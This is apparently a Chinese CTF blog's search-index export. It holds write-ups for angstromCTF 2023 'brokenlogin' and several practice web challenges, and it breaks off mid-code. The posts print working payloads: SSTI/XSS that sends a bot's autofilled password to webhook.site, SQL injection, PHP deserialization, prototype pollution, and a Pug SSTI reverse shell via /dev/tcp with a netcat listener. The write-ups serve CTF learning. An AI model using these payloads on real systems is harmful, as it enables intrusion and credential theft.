<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>angstromCTF 2023 brokenlogin解题</title>
    <url>/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/</url>
    <content><![CDATA[<p>WEB brokenlogin</p>
<span id="more"></span>

<p>题目给了两个网页和两个源码，分别是</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173909360.png" alt="image-20230428173909360"></p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428173915868.png" alt="image-20230428173915868"></p>
<p>源码分别为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;brokenlogin&quot;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">7000</span>,</span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">execute</span>(<span class="params">browser, url</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^https:\/\/brokenlogin\.web\.actf\.co\/.*/</span>.<span class="title function_">test</span>(url)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForNetworkIdle</span>(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=username]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=username]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el</span>) =&gt;</span> (el.<span class="property">value</span> = <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;input[name=password]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.$eval(</span><br><span class="line">            <span class="string">&quot;input[name=password]&quot;</span>,</span><br><span class="line">            <span class="function">(<span class="params">el, password</span>) =&gt;</span> (el.<span class="property">value</span> = password),</span><br><span class="line">            process.<span class="property">env</span>.<span class="property">CHALL_BROKENLOGIN_FLAG</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;input[type=submit]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, escape, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">fails = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">indexPage = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Broken Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;color: red; fontSize: &#x27;28px&#x27;;&quot;&gt;%s&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Number of failed logins: &#123;&#123; fails &#125;&#125;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    custom_message = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;message&quot;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(request.args[<span class="string">&quot;message&quot;</span>]) &gt;= <span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(indexPage, fails=fails)</span><br><span class="line">        </span><br><span class="line">        custom_message = escape(request.args[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template_string(indexPage % custom_message, fails=fails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">global</span> fails</span><br><span class="line">    fails += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&quot;wrong username or password&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>先看第一个源代码，主要有用的地方是</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174142845.png" alt="image-20230428174142845"></p>
<p>意思是有username和password输入框，但是password输入框这里多了一条<code>process.env.CHALL_BROKENLOGIN_FLAG</code>，flag就在其中</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174328760.png" alt="image-20230428174328760"></p>
<p>这里的意思是通过eval方法来获取名为password的元素，并将它设置为<code>process.env.CHALL_BROKENLOGIN_FLAG</code></p>
<p>然后再看另一个源代码，这里有一个路由</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428174556173.png" alt="image-20230428174556173"></p>
<p>这里可以传参message，还有两个if，看第二个if，如果传入的message大于等于25，就会<code>return render_template_string(indexPage, fails=fails)</code>，否则就会<code>return render_template_string(indexPage % custom_message, fails=fails)</code>，第二个return可以将我们传参的message包含进去，猜测有ssti，去网页上测试一下</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428175356726.png" alt="image-20230428175356726"></p>
<p>确实可以ssti，但是有限制，message传参的长度不能大于25，绕过这个可以使用以下payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?message=&#123;&#123;request.args.a&#125;&#125;&amp;a=</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428193302563.png" alt="image-20230428193302563"></p>
<p>这样就可以绕过长度限制，试试看能不能使用xss</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194624660.png" alt="image-20230428194624660"></p>
<p>将输入的当成了字符串，可以使用safe，如以下，可以xss语句判定为安全，而不是转为字符串</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194635131.png" alt="image-20230428194635131"></p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428194827209.png" alt="image-20230428194827209"></p>
<p>这样就成功执行了，因为flag在password，所以需要读取这里的信息，如果username和password什么都不输入，就会自动填入我们想要的信息，所以再构造一个表单，使用<a href="https://webhook.site/">webhook</a>来进行截取，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://brokenlogin.web.actf.co/?message=&#123;&#123;request.args.a|safe&#125;&#125;&amp;a=&lt;form action=&quot;https://webhook.site/14144f4b-81cb-4e28-b9b0-0e067d387836&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;username&quot;&gt;Username: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;Password: &lt;/label&gt;</span><br><span class="line">            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line">            &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195535198.png" alt="image-20230428195535198"></p>
<p>成功构造出一个表单，使用bot将网页发出</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195621788.png" alt="image-20230428195621788"></p>
<p>于是在webhook接收到flag</p>
<p><img src="/2023/04/28/(XSS)angstromCTF%202023%20brokenlogin/image-20230428195657372.png" alt="image-20230428195657372"></p>
]]></content>
  </entry>
  <entry>
    <title>5.1解题</title>
    <url>/2023/05/03/5.1%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>5.1</p>
<span id="more"></span>

<h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503113946015.png" alt="image-20230503113946015"></p>
<p>给了提示是mysql8，该版本新出了很多查询新方法，这个题目已经给出了表，经过测试select被过滤了</p>
<p>查资料可以使用TABLE新出的查询语句</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; TABLE flagusers ORDER BY username LIMIT 1#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>使用payload后直接回显了用户名和密码</p>
<h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === <span class="string">&#x27;i_am_pop_god&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="string">&#x27;nonono too yong too simple&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以反序列化，当<code>start</code>的值等于<code>i_am_pop_god</code>时就会返回flag，但是<code>__wakeup</code>魔术方法会将<code>start</code>赋值为<code>nonono too yong too simple</code>，所以需要绕过这个魔术方法</p>
<p>有一种绕过方法是修改反序列化后的数据，修改元素数，例如这个反序列化有3个元素，那就将3修改成大于3的数</p>
<p>但是这里不能使用这个方法，版本不支持，但还有另一种方法，可以使用引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params">&amp;<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$x</span>=&amp;<span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">输出<span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>本来让$a等于的11，按理说应该输出的11，但是这个却是输出的123</p>
<p>取消&amp;符号后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span> (<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$x</span>=<span class="variable">$a</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;11&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">输出<span class="number">11</span></span><br></pre></td></tr></table></figure>

<p>这就输出了11</p>
<p>利用这个引用的方法，让<code>__wakeup</code>执行以后，再进行引用来修改值</p>
<p>利用源代码中的<code>$this-&gt;b=$this-&gt;a;</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b= &amp;<span class="variable">$a</span>-&gt;start;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&quot;i_am_pop_god&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150532218.png" alt="image-20230503150532218"></p>
<p>访问&#x2F;time</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150548438.png" alt="image-20230503150548438"></p>
<p>查看cookie，发现里面有一个time，<code>time=MQ%3D%3D</code>将MQbase64解码为1，%3D是&#x3D;，这个应该存在注入点</p>
<p>给了提示是<a href="https://www.hackingloops.com/ssti-in-pug/">pug模板ssti</a>，查询资料查到<code>#&#123;7*7&#125;</code></p>
<p>使用试试，注意要将传入的base64编码</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150848571.png" alt="image-20230503150848571"></p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503150853016.png" alt="image-20230503150853016"></p>
<p>顺利返回</p>
<p>直接使用shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&#123;function()&#123;localLoad=global.process.mainModule.constructor._load;sh=localLoad(&quot;child_process&quot;).exec(&#x27;bash -c &quot;sh -i &gt;&amp; /dev/tcp/xx.x.x.xx/1111 0&gt;&amp;1&quot;&#x27;)&#125;()&#125;</span><br></pre></td></tr></table></figure>

<p>编码以后传入</p>
<p>使用云服务器监听1111端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1111</span><br></pre></td></tr></table></figure>

<h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503151212372.png" alt="image-20230503151212372"></p>
<p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nunjucks = <span class="built_in">require</span>(<span class="string">&#x27;nunjucks&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> uuid = <span class="built_in">require</span>(<span class="string">&quot;uuid&quot;</span>).<span class="property">v4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SESSION_SECRET</span> = process.<span class="property">env</span>.<span class="property">SESSION_SECRET</span> || <span class="title function_">uuid</span>();</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">nunjucks.<span class="title function_">configure</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&#x27;views&#x27;</span>), &#123;</span><br><span class="line">    <span class="attr">autoescape</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">express</span>: app</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .<span class="title function_">engine</span>(<span class="string">&#x27;njk&#x27;</span>,nunjucks.<span class="property">render</span>)</span><br><span class="line">    .<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>,<span class="string">&#x27;njk&#x27;</span>)</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;</span><br><span class="line">        <span class="attr">extended</span>: <span class="literal">true</span></span><br><span class="line">    &#125;))</span><br><span class="line">    .<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">cookieParser</span>())</span><br><span class="line">    .<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">        <span class="attr">secret</span>:<span class="variable constant_">SESSION_SECRET</span>,</span><br><span class="line">        <span class="attr">resave</span>:<span class="literal">false</span>,</span><br><span class="line">        <span class="attr">saveUninitialized</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="attr">cookie</span>:&#123;</span><br><span class="line">            <span class="attr">maxAge</span>:<span class="number">3600</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">checkLogin</span> = (<span class="params">req, res, next</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">token</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;plz login first&#x27;</span> &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> check=&#123;&#125;</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;please try to get(may be post) /login to login &#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="title function_">async</span>(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> user=&#123;&#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    user = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">username</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(check.<span class="property">Admin</span>)</span><br><span class="line">    <span class="keyword">if</span>(user.<span class="property">username</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (user.<span class="property">username</span>==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">               check.<span class="property">Admin</span> = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">           &#125;</span><br><span class="line">            <span class="keyword">switch</span> (check.<span class="property">Admin</span>)&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">token</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">username</span> = user.<span class="property">username</span>;</span><br><span class="line">                    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/admin&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    req.<span class="property">session</span>.<span class="property">token</span> = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">                    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/user&#x27;</span>);</span><br><span class="line">                <span class="attr">default</span>:</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;please send you username as json to login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/user&#x27;</span>,checkLogin,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&#x27;go away you are not ture admin&#x27;</span></span><br><span class="line">    res.<span class="title function_">send</span>(r);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/admin&#x27;</span>,checkLogin,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> r = <span class="string">&#x27;Hello admin ! here is you flag&#123;xxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line">    res.<span class="title function_">send</span>(r);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="string">&#x27;80&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:80`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>有<code>merge()</code>和<code>clone()</code>函数，应该是原型链污染</p>
<p>有四个路由，&#x2F;，&#x2F;login，&#x2F;user，&#x2F;admin，获取flag需要访问&#x2F;admin，但是需要登录，在&#x2F;login中</p>
<p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503154837759.png" alt="image-20230503154837759"></p>
<p>让username等于admin后，Admin会赋值0，进而会自动跳转到&#x2F;user，需要考虑怎样让Admin等于1，这样就能跳转到&#x2F;admin</p>
<p>使用原型链污染</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;Admin&quot;:&quot;1&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p><img src="/2023/05/03/5.1%E9%A2%98%E7%9B%AE/image-20230503160943980.png" alt="image-20230503160943980"></p>
<p>源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs=<span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParse = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">IfLogin</span>(<span class="params">req, res, next</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">admin=&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;😍admin😍&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">app=<span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParse.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="string">&#x27;********&#x27;</span>,</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123; <span class="attr">maxAge</span>: <span class="number">3600</span> * <span class="number">1000</span> &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="title class_">IfLogin</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;if you want flag .then go to /admin ,and find a way to get it . no pain, no gain !&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>,<span 